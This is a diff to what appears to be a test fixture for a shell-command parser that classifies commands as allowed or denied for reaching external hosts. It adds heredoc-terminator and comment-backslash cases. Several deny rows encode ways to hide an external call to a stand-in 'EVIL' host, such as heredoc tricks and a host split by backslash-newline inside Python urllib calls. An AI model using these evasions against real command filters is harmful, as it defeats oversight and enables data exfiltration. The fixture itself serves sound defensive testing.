@@ -26,7 +26,7 @@ const TARGET = `https://${EVIL}/`
 const SCRATCH = '/tmp/0983-x.txt'
 
 // Ids of DENY_ROWS that deny through AmbiguousShellSyntax('heredoc-near-terminator'): no host is reported.
-export const FAILCLOSED_IDS = ['T-trail-space', 'T-lead-space']
+export const FAILCLOSED_IDS = ['T-trail-space', 'T-lead-space', 'T-dash-tab-trail', 'T-part-trail']
 export const FAILCLOSED_REASON = 'heredoc-near-terminator'
 // The host the DENY rows must report (a substring of one entry of `hosts`; the I rows report it behind the
 // open local prefix).
@@ -63,6 +63,11 @@ export const DENY_ROWS = [
   // not measured on a real shell, so the parser must not guess: deny.
   ['T-trail-space', 'body line "E " (trailing blank) behind the tag E', `cat <<${Q}E${Q}${NL}x${NL}E ${NL}${DEST}${NL}E`],
   ['T-lead-space', 'body line " E" (leading blank) behind the tag E with <<', `cat <<${Q}E${Q}${NL}x${NL} E${NL}${DEST}${NL}E`],
+  ['T-dash-tab-trail', '<<- terminator line is a tab, the tag and a trailing blank', `cat <<-${Q}E${Q}${NL}${TAB}x${NL}${TAB}E ${NL}${DEST}${NL}E`],
+  ['T-part-trail', 'partly quoted tag E"F", terminator line EF and a trailing blank', `cat <<E"F"${NL}x${NL}EF ${NL}${DEST}${NL}EF`],
+  // A comment does not continue onto the next line: a comment line ending in one backslash leaves the next
+  // line a command the shell runs.
+  ['E1-comment-bs', 'comment line ends in a backslash, the external call runs on the next line', `# note${BS}${NL}${DEST}`],
   // Interpreter code: the interpreter itself joins backslash-newline inside a string literal.
   ['I1-py-heredoc-host-cont', 'python heredoc, host continued after a backslash-newline', `python3 - <<${Q}PY${Q}${NL}import urllib.request as u${NL}u.urlopen("${LOCAL}${BS}${NL}.${EVIL}/")${NL}PY`],
   ['I2-py-c-host-cont', 'python -c, host continued after a backslash-newline', `python3 -c ${Q}import urllib.request as u; u.urlopen("${LOCAL}${BS}${NL}.${EVIL}/")${Q}`],
@@ -83,6 +88,7 @@ export const ALLOW_ROWS = [
   ['C-u-body-even', 'unquoted body, even backslash run', `cat <<E${NL}x${BS}${BS}${NL}E${NL}echo done`],
   ['C-multiline-local', 'multi-line local call joined by backslashes', `${CU} -s ${BS}${NL}  -H "Accept: application/json" ${BS}${NL}  ${LOCAL}:3420/api/kanban`],
   ['C-gh-body', 'gh pr create with a heredoc body in $(...)', `gh pr create --title t --body "$(cat <<${Q}EOF${Q}${NL}line one ${BS}${NL}line two${NL}EOF${NL})"`],
+  ['E1-comment-bs-local', 'comment line ends in a backslash, a local health call on the next line', `# note${BS}${NL}${LOCAL_CALL}`],
   ['C-sq-arg-cont', 'backslash-newline inside single quotes', `echo ${Q}a ${BS}${NL}b${Q}; ${LOCAL_CALL}`],
 ]
 
